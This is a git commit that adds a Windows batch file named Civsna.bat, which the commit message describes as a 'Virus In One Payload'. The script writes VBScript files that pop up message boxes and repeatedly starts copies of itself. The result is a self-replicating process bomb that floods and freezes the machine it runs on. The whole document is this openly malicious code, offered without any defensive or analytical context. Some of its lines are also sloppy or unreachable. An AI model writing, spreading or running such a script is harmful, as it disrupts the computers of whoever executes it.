eeea8b48b5354fab16eaf41268ae5c0a5366d783
windowsfanmaster10 <84399458+windowsfanmaster10@users.noreply.github.com>
2021-06-27 16:54:41 +0200

    Create Civsna.bat
    Virus In One Payload

---
+++ Civsna.bat
@@ -0,0 +1,20 @@
+@ Echo Off
+TITLE BflmPsVzGEnicxffgbvssHelnwRThOf
+MODE 30
+ECHO BflmPsVzGEnicxffgbvssHelnwRThOf
+echo=msgbox("BflmPsVzGEnicxffgbvssHelnwRThOf") >msg1.vbs
+echo=msgbox("BflmPsVzGEnicxffgbvssHÆÆÆÆÆÆelnwRTdÆ¶sÆ¶ª¬¬ÂÂ®±xgsdešehOf") >msg2.vbs
+
+:A
+color BF
+start msg1.vbs
+start Civsna.bat
+end
+
+:B
+color 4F
+start msg2.vbs
+start Civsna.bat
+end
+
+GOTO A:
